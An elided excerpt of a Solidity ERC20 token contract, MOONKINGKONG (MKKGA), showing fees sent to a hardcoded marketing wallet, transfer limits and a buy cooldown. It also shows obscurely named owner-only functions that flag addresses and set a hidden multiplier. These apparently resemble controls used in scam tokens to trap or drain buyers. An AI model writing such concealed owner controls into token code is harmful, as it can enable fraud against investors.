...
contract MKKGA is Context, IERC20, Ownable {
    ...
    string private constant _name = "MOONKINGKONG"; //
    string private constant _symbol = "MKKGA"; //
    uint8 private constant _decimals = 18; //
    uint256 private _fbbe = 1;

    uint256 public _marketingFee = 7;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x24C406a78Bd8fce7F4BAf1984Ec85dB21519e9AC;
    ...
    function setFBMKKGA(address addr, bool bv) external onlyOwner {
        _isFB[addr] = bv;
    }

    function setFEMKKGA(uint256 fe) external onlyOwner {
        _fbbe = fe;
    }
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "MKKGA ERC20: approve from the zero address");
        require(spender != address(0), "MKKGA ERC20: approve to the zero address");
    ...
    function _transfer(
        ...
        require(from != address(0), "MKKGA ERC20: transfer from the zero address");
        require(to != address(0), "MKKGA ERC20: transfer to the zero address");
        require(amount > 0, "MKKGA Transfer amount must be greater than zero");

        if (from != owner() && to != owner() && to != uniswapV2Pair)
            require(balanceOf(to) + amount <= _maxTxAmount, "MKKGA Transfer amount exceeds the maxTxAmount.");


        if (from == uniswapV2Pair) {
            require(_lastBuy[to] + _buyCooldown < block.timestamp, "MKKGA Must wait til after coooldown to buy");
